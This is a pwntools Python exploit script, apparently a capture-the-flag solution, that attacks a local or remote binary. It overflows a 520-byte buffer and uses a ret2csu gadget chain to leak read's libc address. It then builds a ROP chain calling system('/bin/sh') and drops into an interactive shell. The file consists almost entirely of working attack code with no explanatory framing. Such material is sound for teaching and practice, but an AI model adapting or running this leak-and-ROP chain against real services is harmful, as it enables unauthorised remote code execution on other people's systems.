from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
b *0x40124c
b *0x40124a
b *0x4011e2
continue
'''.format(**locals())

# Binary filename
exe = './all_patched_up_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

def ret2csu(rbx, rbp, r12, r13, r14, r15, ret):
    payload = flat([
        b'A' * offset,
        csu1, rbx, rbp, r12, r13, r14, r15,
        csu2,
        b'0' * 56, # JUNK to  reach the return address
        ret
    ])
    return payload


# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc-2.31.so")

offset = 520

# Start program
io = start()

csu1 = 0x40124a # pop r12, r13, r14, r15, mov rdi, 1
csu2 = 0x401230 # rdx, rsi, edi, call [r15 + rbx*8]
# Build the payload
payload1 = ret2csu(rbx=0, rbp=1, r12=1, r13=elf.got.read, r14=8, r15=elf.got.write, ret=elf.sym['main'])
# Send the payload
io.sendlineafter(b'>', payload1)

leak = io.recvuntil(b'>')
print(leak)
read_leak = unpack(leak[1:-1].ljust(8, b'\x00'))
info(hex(read_leak))
libc.address = read_leak - libc.symbols['read']
info("LIBC Base: " + hex(libc.address))

# Nothing works :(
# oneshot1 = 0xe3afe # r12, r15 == NULL
# oneshot2 = 0xe3b01 # r15, rdx == NULL
# oneshot3 = 0xe3b04 # rdx, rsi == NULL
# payload2 = ret2csu(rbx=0, rbp=1, r12=0, r13=0, r14=0, r15=libc.address+oneshot3, ret=ret)

pop_rdi = libc.address + 0x23b6a
payload2 = flat({offset: [
    pop_rdi+1,
    pop_rdi,
    next(libc.search(b"/bin/sh\x00")),
    libc.sym['system']
]})

io.sendline(payload2)
io.interactive()
